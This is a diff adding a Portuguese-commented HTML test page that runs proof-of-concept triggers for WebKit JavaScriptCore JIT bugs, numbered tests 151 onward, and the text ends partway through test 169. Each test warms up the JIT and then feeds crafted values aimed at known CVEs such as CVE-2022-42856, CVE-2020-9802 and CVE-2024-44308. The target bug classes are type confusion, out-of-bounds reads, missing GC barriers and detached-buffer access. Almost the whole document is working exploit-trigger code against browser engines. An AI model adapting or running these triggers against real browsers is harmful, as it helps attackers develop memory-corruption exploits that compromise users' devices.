@@ -1,0 +1,1213 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Testes07 — CVE PoC Novos Vetores</title></head>
+<body>
+
+<p>Novos vetores: CVE-2022-42856, CVE-2020-9802 CSE, LICM exact PoC (saelo),
+inferred-type widening, obj[prop]++ dupla avaliacao, DFG store barrier,
+CVE-2017-2446, CVE-2024-44308, CVE-2025-14174, entre outros.</p>
+
+<button onclick="runAll()">RODAR TODOS</button>
+<br><br>
+<button onclick="t151()">Teste 151</button>
+<button onclick="t152()">Teste 152</button>
+<button onclick="t153()">Teste 153</button>
+<button onclick="t154()">Teste 154</button>
+<button onclick="t155()">Teste 155</button>
+<button onclick="t156()">Teste 156</button>
+<button onclick="t157()">Teste 157</button>
+<button onclick="t158()">Teste 158</button>
+<button onclick="t159()">Teste 159</button>
+<button onclick="t160()">Teste 160</button>
+<button onclick="t161()">Teste 161</button>
+<button onclick="t162()">Teste 162</button>
+<button onclick="t163()">Teste 163</button>
+<button onclick="t164()">Teste 164</button>
+<button onclick="t165()">Teste 165</button>
+<button onclick="t166()">Teste 166</button>
+<button onclick="t167()">Teste 167</button>
+<button onclick="t168()">Teste 168</button>
+<button onclick="t169()">Teste 169</button>
+<button onclick="t170()">Teste 170</button>
+<button onclick="t171()">Teste 171</button>
+<button onclick="t172()">Teste 172</button>
+<button onclick="t173()">Teste 173</button>
+<button onclick="t174()">Teste 174</button>
+<button onclick="t175()">Teste 175</button>
+
+<pre id="o"></pre>
+
+<script>
+function log(m){ document.getElementById('o').textContent += m + '\n'; }
+
+function runAll(){
+  log('=== RODAR TODOS: inicio ===');
+  t151(); t152(); t153(); t154(); t155();
+  t156(); t157(); t158(); t159(); t160();
+  t161(); t162(); t163(); t164(); t165();
+  t166(); t167(); t168(); t169(); t170();
+  t171(); t172(); t173(); t174(); t175();
+  log('=== RODAR TODOS: fim ===');
+}
+
+// T151 — CVE-2022-42856: FTL type confusion SpecFullDouble vs SpecDoubleReal
+// FTL usa ~SpecFullDouble no isNotInt32 em vez de ~SpecDoubleReal;
+// NaN e tratado como Int32 quando nao deveria, causando type confusion
+function t151(){
+  log('Teste 151: inicio');
+  try {
+    function makeNaN(){ return NaN; }
+    function trigger(v){
+      // FTL vai especular que v nao e Int32 via SpecFullDouble
+      // NaN passa no check SpecFullDouble mas nao em SpecDoubleReal
+      let x = v + 0;     // se v=NaN, x=NaN (Double)
+      let y = x | 0;     // ToInt32(NaN) = 0 — mas FTL pode nao inserir este check
+      let arr = new Float64Array(8);
+      arr[y] = x;        // write com index possivelmente errado
+      return arr[y];
+    }
+    // Warmup com doubles normais (nao NaN)
+    for(let i = 0; i < 0x80000; i++) trigger(i * 0.1 + 0.1);
+    // Pos-FTL: injetar NaN — FTL pode tratar como Int32 antes do |0
+    for(let i = 0; i < 1000; i++){
+      try { trigger(NaN); }       catch(e){}
+      try { trigger(-0); }        catch(e){}
+      try { trigger(Infinity); }  catch(e){}
+      try { trigger(-Infinity); } catch(e){}
+    }
+    // Variante com comparacao aritmetica
+    function cmpDouble(a, b){
+      if(a > b) return a - b;
+      return b - a;
+    }
+    for(let i = 0; i < 0x80000; i++) cmpDouble(i * 0.1, i * 0.2);
+    try { cmpDouble(NaN, 1.0); }       catch(e){}
+    try { cmpDouble(1.0, NaN); }       catch(e){}
+    try { cmpDouble(NaN, NaN); }       catch(e){}
+    try { cmpDouble(Infinity, NaN); }  catch(e){}
+  } catch(e){}
+  log('Teste 151: fim');
+}
+
+// T152 — CVE-2020-9802: CSE (Common Subexpression Elimination) incorreto
+// CSE elimina segunda leitura de obj.a assumindo que fn() entre as duas
+// nao pode alterar obj.a — mas pode (JSC nao modela efeitos corretamente)
+// PoC derivado do Project Zero JITSploitation I
+function t152(){
+  log('Teste 152: inicio');
+  try {
+    let sideEffectObj = null;
+    function sideEffect(){
+      if(sideEffectObj) sideEffectObj.a = 0x1337; // modifica obj.a
+    }
+    function victim(obj){
+      let v1 = obj.a;   // primeira leitura — CSE vai cachear
+      sideEffect();      // pode alterar obj.a, mas CSE ignora
+      let v2 = obj.a;   // CSE pode substituir por v1 (incorreto!)
+      // v1 deveria != v2 se sideEffect rodou; CSE faz v1 === v2
+      return v2;
+    }
+    // Criar objeto e associar ao sideEffect
+    const o = { a: 1.1, b: 2.2, noCoW: {} };
+    sideEffectObj = o;
+    // Warmup para JIT/FTL compilar victim
+    for(let i = 0; i < 0x30000; i++){
+      o.a = i * 0.1;
+      victim(o);
+    }
+    // Pos-FTL: CSE pode estar eliminando a segunda leitura
+    for(let i = 0; i < 1000; i++){
+      try {
+        o.a = i * 1.1;
+        let r = victim(o);
+        // r deveria ser 0x1337 apos sideEffect; com CSE bugado seria i*1.1
+        if(r !== 0x1337 && r !== i * 1.1){
+          let arr = new Float64Array(8);
+          arr[0] = r; // usar valor possivelmente corrompido
+        }
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 152: fim');
+}
+
+// T153 — LICM exact PoC (saelo / CVE-2019-8518 variante):
+// for-in + acesso com indice negativo + StoreProperty forca CheckStructure;
+// LICM hoist GetByVal[-698666199] para antes do bounds check
+function t153(){
+  log('Teste 153: inicio');
+  try {
+    const v3 = [1337, 1337, 1337, 1337]; // evitar COW storage
+    const v6 = [1337, 1337];             // array alvo
+    function v7(v8){
+      for(let v9 in v8){
+        v8.a = 42;              // StoreProperty forca CheckStructure
+        const v10 = v8[-698666199]; // indice negativo OOB apos LICM hoist
+      }
+    }
+    // Executar suficiente para tier-up (sem --thresholdForFTLOptimizeAfterWarmUp)
+    for(let i = 0; i < 0x50000; i++){
+      try { v7(v6); }    catch(e){}
+      try { v7(1337); }  catch(e){} // arg nao-array forca bailout em tiers baixos
+    }
+  } catch(e){}
+  log('Teste 153: fim');
+}
+
+// T154 — Inferred type widening: DFG omite type check apos inferencia erronea
+// Primeira atribuicao de obj.x com Int32 instaura inferred type;
+// atribuicao posterior com Double "widena" o tipo mas JIT pode ter compilado
+// codigo que assume Int32 e nao e invalidado
+function t154(){
+  log('Teste 154: inicio');
+  try {
+    function readX(o){ return o.x * 2; } // JIT infere x como Int32
+
+    // Criar objetos — primeira atribuicao de .x com Int32
+    const objs = [];
+    for(let i = 0; i < 200; i++){
+      const o = { x: i, y: i * 2 };
+      objs.push(o);
+    }
+    // Warmup: JIT ve sempre Int32 em .x — inferred type = Int32
+    for(let i = 0; i < 0x30000; i++) readX(objs[i % 200]);
+
+    // Agora "widenar" o tipo atribuindo Double em .x de um dos objetos
+    objs[0].x = 1.5; // widening: Int32 -> Number
+    // JIT ainda assume Int32 para readX; acesso pos-widening pode usar check omitido
+    for(let i = 0; i < 1000; i++){
+      try { readX(objs[i % 200]); } catch(e){}
+    }
+
+    // Versao mais agressiva: atribuir tipo totalmente diferente
+    objs[1].x = { valueOf(){ return 99; } }; // Object — widening para AnyValue
+    for(let i = 0; i < 500; i++){
+      try { readX(objs[i % 200]); } catch(e){}
+    }
+
+    // Symbol forca widening para top type
+    objs[2].x = Symbol('x');
+    for(let i = 0; i < 500; i++){
+      try { readX(objs[i % 200]); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 154: fim');
+}
+
+// T155 — obj[prop]++ dupla avaliacao de prop (WebKit bug 270150)
+// Em obj[prop]++, JSC avaliava prop duas vezes: uma para GetByVal e outra para PutByVal
+// Se prop tem efeito colateral (getter), o efeito ocorre duas vezes
+function t155(){
+  log('Teste 155: inicio');
+  try {
+    let keyEvalCount = 0;
+    const keyObj = {
+      toString: function(){
+        keyEvalCount++;
+        if(keyEvalCount % 2 === 0) return '1'; // segunda eval retorna indice diferente
+        return '0';
+      },
+      valueOf: function(){ return keyEvalCount % 2; }
+    };
+
+    const arr = [10, 20, 30];
+    // Warmup: obj[prop]++ com chave normal
+    for(let i = 0; i < 0x20000; i++){
+      let k = 'val';
+      let o = { val: i };
+      o[k]++;
+    }
+
+    // Pos-JIT: usar chave com side-effect
+    for(let i = 0; i < 1000; i++){
+      try { arr[keyObj]++; }     catch(e){} // dupla avaliacao de keyObj
+      try { arr[keyObj] += 1; }  catch(e){} // mesmo mecanismo
+      try { ++arr[keyObj]; }     catch(e){} // pre-increment
+    }
+
+    // Chave com Symbol.toPrimitive que muda valor
+    let tpCount = 0;
+    const tpKey = {
+      [Symbol.toPrimitive](hint){
+        tpCount++;
+        if(hint === 'number') return tpCount % 3;
+        return 'key_' + (tpCount % 2);
+      }
+    };
+    const o2 = { key_0: 0, key_1: 1 };
+    for(let i = 0; i < 500; i++){
+      try { o2[tpKey]++; } catch(e){}
+    }
+
+    // Deletar a chave durante a avaliacao dupla
+    let delCount = 0;
+    const delKey = {
+      toString: function(){
+        delCount++;
+        if(delCount === 2) delete arr[0]; // deletar durante segundo eval
+        return '0';
+      }
+    };
+    try { arr[delKey]++; } catch(e){}
+  } catch(e){}
+  log('Teste 155: fim');
+}
+
+// T156 — CVE-2024-44308: scratch2 register nao-inicializado em DFG PutByVal
+// O registrador scratch2 e alocado apos possivel deoptimizacao via slow path;
+// se a slow path e tomada, scratch2 nao foi inicializado mas e usado no stack spill
+function t156(){
+  log('Teste 156: inicio');
+  try {
+    // Funcao que o DFG vai compilar com PutByVal especializado
+    function putVal(ta, idx, val){
+      ta[idx] = val; // DFG PutByVal — scratch2 pode nao ser inicializado
+      return ta[idx];
+    }
+
+    // Warmup: sempre Float64 em Float64Array
+    const fa = new Float64Array(256);
+    for(let i = 0; i < 0x40000; i++) putVal(fa, i % 256, i * 0.123456789);
+
+    // Pos-FTL: forcar slow path via tipos que nao sejam Float64
+    // Slow path pode ser tomada sem inicializar scratch2
+    const slowVals = [
+      { valueOf(){ return 1.5; } },  // objeto — ToNumber via slow path
+      null,
+      undefined,
+      true, false,
+      NaN, -0, Infinity,
+      '1.5',                         // string — conversao via slow path
+      BigInt(42),                    // BigInt — TypeError via slow path
+    ];
+    for(let v of slowVals){
+      for(let i = 0; i < 100; i++){
+        try { putVal(fa, i, v); } catch(e){}
+      }
+    }
+
+    // Int32Array com mesmos valores problematicos
+    const ia = new Int32Array(256);
+    for(let i = 0; i < 0x40000; i++) putVal(ia, i % 256, i);
+    for(let v of slowVals){
+      try { putVal(ia, 0, v); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 156: fim');
+}
+
+// T157 — CVE-2017-2446 / isHavingABadTime: Array.prototype modificado sem invalidar JIT
+// haveABadTime() desabilita otimizacoes quando Array.prototype tem elementos;
+// adicionar elemento em Array.prototype antes do JIT compilar pode escapar da invalidacao
+function t157(){
+  log('Teste 157: inicio');
+  try {
+    // Adicionar elemento antes de qualquer JIT compilation
+    Array.prototype[99] = 'proto_element';
+
+    function sumArr(arr){
+      let s = 0;
+      for(let i = 0; i < arr.length; i++) s += arr[i];
+      return s;
+    }
+
+    const arr = new Array(10).fill(1.1);
+    // Warmup: arr.length=10, mas arr[99] existe via proto
+    for(let i = 0; i < 0x30000; i++) sumArr(arr);
+
+    // Modificar arr.length para incluir o indice 99
+    arr.length = 100;
+    try { sumArr(arr); } catch(e){} // JIT pode nao ver arr[99] vindo do proto
+
+    // Remover e re-adicionar para variar
+    delete Array.prototype[99];
+    Array.prototype[5] = 'middle_proto';
+    for(let i = 0; i < 0x20000; i++) sumArr(arr);
+    try { sumArr(new Array(10).fill(2.2)); } catch(e){}
+
+    // Getter no Array.prototype
+    Object.defineProperty(Array.prototype, '3', {
+      get: function(){ return 999.9; },
+      configurable: true, enumerable: true
+    });
+    try { sumArr([1.1, 2.2, 3.3, 4.4, 5.5]); } catch(e){}
+  } catch(e){
+  } finally {
+    try { delete Array.prototype[99]; }  catch(e){}
+    try { delete Array.prototype[5]; }   catch(e){}
+    try { delete Array.prototype[3]; }   catch(e){}
+  }
+  log('Teste 157: fim');
+}
+
+// T158 — DFG Store Barrier faltando em loop com Upsilon/Phi (CVE-2025-43529 store barrier)
+// ObjectAllocationSinkingPhase: Phi marca objeto como escaped,
+// mas DFGStoreBarrierInsertionPhase nao insere barrier antes de store nos Upsilon inputs;
+// GC pode coletar o objeto enquanto referencia viva existe via Phi
+function t158(){
+  log('Teste 158: inicio');
+  try {
+    let live = null;
+    function barrierTest(n, doGC){
+      // Criar dois objetos — candidatos a Phi merge
+      const A = { tag: 'A', buf: new Float64Array(4), val: n };
+      const B = { tag: 'B', buf: new Uint32Array(4),  val: n * 2 };
+
+      let obj = n % 2 ? A : B; // Phi de A ou B
+
+      // Store sem barrier: se barrier faltou, GC pode invalidar o pointeiro
+      obj.buf[0] = n;
+      obj.buf[1] = n + 1;
+
+      if(doGC){
+        // GC pressure: se barrier faltou em Upsilon, obj pode ser coletado
+        let trash = new Array(30000).fill(null).map(function(){ return { x: new Uint8Array(4) }; });
+        trash = null;
+      }
+
+      live = obj; // escape do Phi — faz marking obrigatorio
+      return obj.val + obj.buf[0];
+    }
+
+    // Warmup sem GC
+    for(let i = 0; i < 0x60000; i++) barrierTest(i, false);
+
+    // Pos-FTL: ativar GC — se barrier faltou, crash aqui
+    for(let i = 0; i < 500; i++){
+      try {
+        barrierTest(i, true);
+        if(live) live.buf[0] += 1; // acessar objeto que pode ter sido coletado
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 158: fim');
+}
+
+// T159 — CVE-2025-14174: ANGLE/WebGL OOB via processamento de conteudo malicioso
+// Sem WebGL disponivel, testar o caminho de fallback via Canvas 2D que usa ANGLE
+function t159(){
+  log('Teste 159: inicio');
+  try {
+    // Testar via Canvas 2D (usa ANGLE internamente em algumas plataformas)
+    const canvas = document.createElement('canvas');
+    canvas.width  = 256;
+    canvas.height = 256;
+    const ctx = canvas.getContext('2d');
+
+    if(!ctx) throw new Error('sem canvas 2d');
+
+    // Operacoes que passam por ANGLE / GPU path
+    for(let i = 0; i < 1000; i++){
+      try {
+        ctx.clearRect(0, 0, 256, 256);
+        ctx.fillStyle = 'rgba(' + (i%256) + ',0,0,1)';
+        ctx.fillRect(0, 0, 256, 256);
+
+        // getImageData faz readback da GPU — OOB possivel em ANGLE bugado
+        const id = ctx.getImageData(0, 0, 256, 256);
+        const buf = id.data.buffer;
+
+        // Transferir o buffer ImageData via postMessage (ArrayBuffer transfer)
+        const view = new Uint32Array(buf);
+        view[0] = 0xDEADBEEF;
+      } catch(e){}
+    }
+
+    // Criar muitos canvases pequenos rapidamente (stress no ANGLE context manager)
+    const canvases = [];
+    for(let i = 0; i < 100; i++){
+      try {
+        const c = document.createElement('canvas');
+        c.width = 4; c.height = 4;
+        const cx = c.getContext('2d');
+        if(cx){
+          cx.fillRect(0, 0, 4, 4);
+          cx.getImageData(0, 0, 4, 4);
+        }
+        canvases.push(c);
+      } catch(e){}
+    }
+    canvases.length = 0; // descartar todos
+  } catch(e){}
+  log('Teste 159: fim');
+}
+
+// T160 — createRegExpMatchesArray: inferred type widening via match result
+// RegExp.exec retorna Array ou null; JIT infere tipo do resultado e omite checks;
+// resultado malformado via Symbol.replace pode ter tipo diferente do esperado
+function t160(){
+  log('Teste 160: inicio');
+  try {
+    const re = /(\w+)\s+(\d+)/g;
+    function doMatch(s){ return re.exec(s); }
+
+    // Warmup: exec retorna Array com grupos — inferred type = Array
+    const strs = ['hello 123', 'world 456', 'foo 789'];
+    for(let i = 0; i < 0x20000; i++){
+      re.lastIndex = 0;
+      doMatch(strs[i % 3]);
+    }
+
+    // Substituir exec para retornar tipo inesperado
+    const origExec = RegExp.prototype.exec;
+    let hackCount = 0;
+    RegExp.prototype.exec = function(s){
+      hackCount++;
+      const r = origExec.call(this, s);
+      if(hackCount > 0x20000 && r !== null){
+        // Retornar objeto que parece Array mas nao e
+        const fake = { 0: r[0], 1: r[1], 2: r[2], index: r.index,
+                        input: r.input, length: r.length };
+        // sem prototype de Array — inferred type errado
+        return fake;
+      }
+      return r;
+    };
+    for(let i = 0; i < 1000; i++){
+      try {
+        re.lastIndex = 0;
+        let m = doMatch(strs[i % 3]);
+        if(m) m[0].toUpperCase();
+      } catch(e){}
+    }
+    RegExp.prototype.exec = origExec;
+  } catch(e){
+    try { RegExp.prototype.exec = RegExp.prototype.exec; } catch(e2){}
+  }
+  log('Teste 160: fim');
+}
+
+// T161 — DFG ArithMod e ArithDiv com zero — CheckDiv e CheckMod omitidos
+// FTL pode remover CheckDiv quando denominator e visto como constante nao-zero;
+// se denominador muda dinamicamente para zero, divisao por zero nao crasheia mas
+// pode produzir NaN/Inf que corrompem calculos posteriores sem guards
+function t161(){
+  log('Teste 161: inicio');
+  try {
+    function divMod(a, b){ return [a / b, a % b]; }
+
+    // Warmup com denominador nao-zero — FTL "sabe" que b != 0
+    for(let i = 1; i < 0x80001; i++) divMod(i * 3, i);
+
+    // Pos-FTL: denominator = 0 — CheckDiv pode ter sido omitido
+    for(let v of [0, -0, NaN, Infinity, -Infinity, 0.0, 1e-400]){
+      try {
+        let [d, m] = divMod(1, v);
+        // Usar resultados corrompidos como indices de TypedArray
+        let arr = new Int32Array(16);
+        try { arr[d | 0] = 1; } catch(e){}
+        try { arr[m | 0] = 1; } catch(e){}
+      } catch(e){}
+    }
+
+    // Versao com Int32 — divisao inteira por zero e diferente de float
+    function intDiv(a, b){ return (a | 0) / (b | 0); }
+    for(let i = 1; i < 0x80001; i++) intDiv(i, 1 + (i % 100));
+    try { intDiv(1000, 0); }   catch(e){}
+    try { intDiv(-1, 0); }     catch(e){}
+    try { intDiv(0x80000000 | 0, -1); } catch(e){} // overflow especial
+  } catch(e){}
+  log('Teste 161: fim');
+}
+
+// T162 — DFG PutStack / GetStack com OSR exit: valor de stack nao salvo corretamente
+// PutStack/GetStack sao inseridos para salvar/restaurar variaveis em OSR exit;
+// se o valor muda de tipo entre PutStack e o uso pos-exit, o tipo restaurado e errado
+function t162(){
+  log('Teste 162: inicio');
+  try {
+    function stackTest(x, shouldOSR){
+      let local = x * 2.0; // Double — salvo em stack via PutStack
+      if(shouldOSR){
+        // Forcar OSR exit: tipo de retorno inesperado
+        local = { v: local }; // Object: tipo diferente do que PutStack salvou
+      }
+      let result = local; // GetStack: restaura o que foi salvo
+      if(typeof result === 'object') return result.v;
+      return result;
+    }
+
+    // Warmup: shouldOSR=false — JIT compila assumindo local e Double
+    for(let i = 0; i < 0x40000; i++) stackTest(i * 0.5, false);
+
+    // Pos-FTL: shouldOSR=true — GetStack restaura Double mas local e Object
+    for(let i = 0; i < 1000; i++){
+      try { stackTest(i * 0.5, true); } catch(e){}
+    }
+
+    // Variante: local começa como Int32 e muda para String
+    function stackTest2(x, flip){
+      let local = x | 0; // Int32
+      if(flip) local = 'str_' + x; // String
+      return local;
+    }
+    for(let i = 0; i < 0x40000; i++) stackTest2(i, false);
+    for(let i = 0; i < 1000; i++){
+      try { stackTest2(i, true); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 162: fim');
+}
+
+// T163 — DFG: CheckStructureOrEmpty em slot de propriedade opcional
+// JSC tem CheckStructureOrEmpty para lidar com slots opcionais (empty value);
+// se o slot passa de empty para preenchido sem invalidar o IC, o check e pulado
+function t163(){
+  log('Teste 163: inicio');
+  try {
+    class Opt {
+      constructor(hasB){
+        this.a = 1;
+        if(hasB) this.b = 2.0; // b e opcional — slot pode ser empty
+      }
+      getA(){ return this.a; }
+      getB(){ return this.b; } // pode retornar undefined se b nunca foi setado
+    }
+
+    function readAB(o){ return o.getA() + (o.getB() || 0); }
+
+    // Warmup: alternando objetos com e sem b
+    const withB    = new Array(100).fill(null).map(function(){ return new Opt(true);  });
+    const withoutB = new Array(100).fill(null).map(function(){ return new Opt(false); });
+
+    for(let i = 0; i < 0x20000; i++){
+      readAB(withB[i % 100]);
+      readAB(withoutB[i % 100]);
+    }
+
+    // Agora adicionar b dinamicamente em objetos que nao tinham — muda estrutura
+    for(let o of withoutB.slice(0, 50)){
+      o.b = 99.9; // slot que era empty agora tem valor — CheckStructureOrEmpty invalido
+    }
+    for(let i = 0; i < 1000; i++){
+      try { readAB(withoutB[i % 100]); } catch(e){}
+    }
+
+    // Remover b dos objetos que tinham — inverso
+    for(let o of withB.slice(0, 50)){
+      delete o.b;
+    }
+    for(let i = 0; i < 500; i++){
+      try { readAB(withB[i % 100]); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 163: fim');
+}
+
+// T164 — DFG MultiGetByOffset / MultiPutByOffset com muitas estruturas
+// MultiGetByOffset e gerado quando IC tem multiplas estruturas;
+// se o numero de estruturas excede o limite, fallback para generic que pode ter bugs
+function t164(){
+  log('Teste 164: inicio');
+  try {
+    function readVal(o){ return o.val; }
+
+    // Criar 30 estruturas diferentes — cada uma com .val em offset diferente
+    const objs = [];
+    for(let i = 0; i < 30; i++){
+      const o = { val: i * 1.1 };
+      // Adicionar props aleatorias para mudar o offset de .val
+      for(let j = 0; j < i; j++) o['p' + j] = j;
+      objs.push(o);
+    }
+    // Warmup: IC vira MultiGetByOffset com 30 estruturas
+    for(let i = 0; i < 0x30000; i++) readVal(objs[i % 30]);
+
+    // Adicionar mais estruturas alem do limite do MultiGetByOffset
+    const moreObjs = [];
+    for(let i = 30; i < 60; i++){
+      const o = { val: i * 1.1 };
+      for(let j = 0; j < i; j++) o['p' + j] = j;
+      moreObjs.push(o);
+    }
+    for(let i = 0; i < 0x10000; i++) readVal(moreObjs[i % 30]);
+
+    // Agora passar objeto com .val como getter (invalida qualquer MultiGetByOffset)
+    const withGetter = {};
+    for(let j = 0; j < 5; j++) withGetter['p' + j] = j;
+    Object.defineProperty(withGetter, 'val', {
+      get: function(){ return { valueOf(){ return 42.5; } }; },
+      configurable: true
+    });
+    for(let i = 0; i < 500; i++){
+      try { readVal(withGetter); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 164: fim');
+}
+
+// T165 — DFG ArithSub com Int32 underflow: CheckSub omitido por range analysis errado
+// B3 ReduceStrength: se range analysis prova que subtracao nao pode underflow,
+// o CheckSub e removido; se a prova for incorreta, o resultado overflowa silenciosamente
+function t165(){
+  log('Teste 165: inicio');
+  try {
+    // Padrão do CVE-2022-32792: variavel em [0, X], subtracao em [-Y, 0]
+    // B3 conclui que resultado em [-Y, X] e nao overflow — mas pode estar errado
+    function subTest(a, b){
+      let x = (a | 0);           // Int32
+      let y = (b | 0);           // Int32
+      if(x > 0 && y < 0){
+        let diff = x - y;         // subtracao que B3 "prova" nao overflow
+        let arr = new Float64Array(8);
+        // diff pode ser maior que 8 se overflow ocorreu
+        try { arr[diff % 8] = 1.5; } catch(e){}
+        return diff;
+      }
+      return 0;
+    }
+    // Warmup com valores seguros
+    for(let i = 0; i < 0x80000; i++) subTest(i % 100, -(i % 50) - 1);
+
+    // Pos-FTL: valores que causam overflow
+    const dangerPairs = [
+      [0x7FFFFFFF, -1],         // 0x7FFFFFFF - (-1) = 0x80000000 overflowa
+      [0x7FFFFFFF, -0x7FFFFFFF], // soma de maximos
+      [1, -0x7FFFFFFF],          // pequeno - grande negativo
+      [100, -0x7FFFFF00],
+    ];
+    for(let [a, b] of dangerPairs){
+      try { subTest(a, b); } catch(e){}
+    }
+
+    // Versao com adicao (ArithAdd) — mesmo problema
+    function addTest(a, b){
+      let x = (a | 0) & 0x7FFF;  // range [0, 0x7FFF]
+      let y = (b | 0) & 0x7FFF;  // range [0, 0x7FFF]
+      let sum = x + y;             // max = 0xFFFE — B3 prova nao overflow Int32
+      // Mas se & nao for visto pelo B3, pode assumir range maior
+      return sum;
+    }
+    for(let i = 0; i < 0x80000; i++) addTest(i, i);
+    try { addTest(0x7FFFFFFF, 0x7FFFFFFF); } catch(e){}
+  } catch(e){}
+  log('Teste 165: fim');
+}
+
+// T166 — DFG: GetByVal com TypedArray e indice vindo de outro TypedArray (aliasing)
+// JIT pode assumir que dois TypedArrays nao se sobrepõem;
+// se compartilham o mesmo ArrayBuffer em offsets diferentes, aliasing quebra a suposicao
+function t166(){
+  log('Teste 166: inicio');
+  try {
+    const sharedBuf = new ArrayBuffer(256);
+    const f64A = new Float64Array(sharedBuf, 0, 16);  // bytes 0-127
+    const f64B = new Float64Array(sharedBuf, 64, 16); // bytes 64-191 (sobreposicao!)
+    const u8   = new Uint8Array(sharedBuf);
+
+    for(let i = 0; i < 16; i++){
+      f64A[i] = i * 1.1;
+      f64B[i] = i * 2.2;
+    }
+
+    function aliasingRead(a, b, idx){
+      let va = a[idx];       // le de f64A
+      b[idx] = va + 1.0;     // escreve em f64B (que se sobrepoem a f64A!)
+      return a[idx];         // JIT pode cachear a[idx] = va (CSE incorreto)
+    }
+
+    // Warmup com arrays sem aliasing
+    const cleanA = new Float64Array(32);
+    const cleanB = new Float64Array(32);
+    for(let i = 0; i < 0x30000; i++) aliasingRead(cleanA, cleanB, i % 16);
+
+    // Pos-JIT: usar arrays com aliasing real
+    for(let i = 0; i < 1000; i++){
+      try { aliasingRead(f64A, f64B, i % 8); } catch(e){}
+    }
+
+    // Aliasing com Int32Array e Float64Array no mesmo buffer
+    const i32 = new Int32Array(sharedBuf, 0, 32);
+    function mixedAlias(f, i, idx){
+      let fv = f[idx];    // float64 read
+      i[idx * 2] = 0xFF;  // int32 write no mesmo byte (pode mudar bits do float)
+      return f[idx];      // float64 re-read — valor diferente, JIT pode usar CSE
+    }
+    const cleanF64 = new Float64Array(32);
+    const cleanI32 = new Int32Array(32);
+    for(let i = 0; i < 0x20000; i++) mixedAlias(cleanF64, cleanI32, i % 8);
+    try { mixedAlias(f64A, i32, 0); } catch(e){}
+    try { mixedAlias(f64A, i32, 4); } catch(e){}
+  } catch(e){}
+  log('Teste 166: fim');
+}
+
+// T167 — DFG: ToNumber em objeto com Symbol.toPrimitive que lanca apos JIT
+// JIT elimina o ToNumber check quando profile mostra sempre Double;
+// objeto com Symbol.toPrimitive que lanca nao tem exception check no codigo JIT
+function t167(){
+  log('Teste 167: inicio');
+  try {
+    function toNum(v){ return v * 3.14 + 1.0; }
+
+    // Warmup com doubles — JIT elimina ToNumber check
+    for(let i = 0; i < 0x60000; i++) toNum(i * 0.1);
+
+    // Objeto com Symbol.toPrimitive que lanca apos warmup
+    let callN = 0;
+    const evilPrim = {
+      [Symbol.toPrimitive](hint){
+        callN++;
+        if(callN % 5 === 0) throw new RangeError('toPrimitive_throws_' + callN);
+        return callN * 1.1;
+      }
+    };
+    for(let i = 0; i < 500; i++){
+      try { toNum(evilPrim); } catch(e){}
+    }
+
+    // Objeto com valueOf que retorna outro objeto (violacao de spec)
+    const doubleEvil = {
+      valueOf(){ return { valueOf(){ return 42.0; } }; } // nested object
+    };
+    for(let i = 0; i < 200; i++){
+      try { toNum(doubleEvil); } catch(e){}
+    }
+
+    // Mudar Symbol.toPrimitive em objeto que JIT ja profileou
+    const staged = { [Symbol.toPrimitive](h){ return 1.0; } };
+    for(let i = 0; i < 0x30000; i++) toNum(staged);
+    // Agora redefinir para lancar
+    staged[Symbol.toPrimitive] = function(h){ throw new TypeError('staged_throws'); };
+    for(let i = 0; i < 200; i++){
+      try { toNum(staged); } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 167: fim');
+}
+
+// T168 — JSC: ArrayBuffer.prototype.transfer (spec recente) com views pendentes
+// transfer() desanexa o buffer e cria novo; views do buffer antigo ficam detachadas;
+// JIT que tem referencia a view pre-transfer pode acessar ponteiro invalido
+function t168(){
+  log('Teste 168: inicio');
+  try {
+    if(typeof ArrayBuffer.prototype.transfer === 'undefined'){
+      throw new Error('transfer nao suportado');
+    }
+
+    const buf = new ArrayBuffer(256);
+    const f64 = new Float64Array(buf);
+    const u32 = new Uint32Array(buf);
+
+    // Preencher
+    for(let i = 0; i < 32; i++) f64[i] = i * 1.5;
+
+    function readFromView(v, idx){ return v[idx]; }
+    function writeToView(v, idx, val){ v[idx] = val; }
+
+    // Warmup: JIT compila readFromView e writeToView para este buffer/view
+    for(let i = 0; i < 0x20000; i++){
+      readFromView(f64, i % 32);
+      writeToView(f64, i % 32, i * 0.1);
+    }
+
+    // Transfer: buf e desanexado, f64 e u32 ficam detachadas
+    let newBuf;
+    try { newBuf = buf.transfer(); } catch(e){ throw e; }
+
+    // f64 e u32 agora tem buffer.byteLength === 0
+    // JIT ainda tem codigo compilado que acessa f64 — ponteiro morto
+    for(let i = 0; i < 100; i++){
+      try { readFromView(f64, i % 32); }        catch(e){}
+      try { writeToView(f64, i % 32, 1.5); }    catch(e){}
+      try { readFromView(u32, i % 64); }         catch(e){}
+    }
+
+    // Tentar reusar com a nova view
+    const newF64 = new Float64Array(newBuf);
+    for(let i = 0; i < 200; i++){
+      try { readFromView(newF64, i % 32); } catch(e){}
+    }
+
+    // Transfer de buffer que ja foi transferido — deve lancar
+    try { newBuf.transfer(); } catch(e){}
+  } catch(e){}
+  log('Teste 168: fim');
+}
+
+// T169 — JSC: Object.groupBy / Map.groupBy com callback que modifica o iteravel
+// groupBy cria grupos via callback; se callback modifica o array durante iteracao,
+// o array interno pode ter indices invalidos
+function t169(){
+  log('Teste 169: inicio');
+  try {
+    const groupBy = Object.groupBy || Map.groupBy;
+    if(!groupBy) throw new Error('groupBy nao suportado');
+
+    const arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
+    let cbCount = 0;
+    function categorize(v){
+      cbCount++;
+      if(cbCount === 5){
+        arr.push(11, 12); // modificar o array durante groupBy
+        arr.splice(0, 2); // remover elementos
+      }
+      return v % 2 === 0 ? 'even' : 'odd';
+    }
+    try { Object.groupBy(arr, categorize); } catch(e){}
+
+    // groupBy com callback que lanca na metade
+    let throwCount = 0;
+    function maybeThrow(v){
+      throwCount++;
+      if(throwCount === 5) throw new TypeError('groupBy_callback_throws');
+      return v > 5 ? 'big' : 'small';
+    }
+    try { Object.groupBy([1,2,3,4,5,6,7,8,9,10], maybeThrow); } catch(e){}
+
+    // groupBy com Symbol.iterator customizado
+    let iterN = 0;
+    const customIter = {
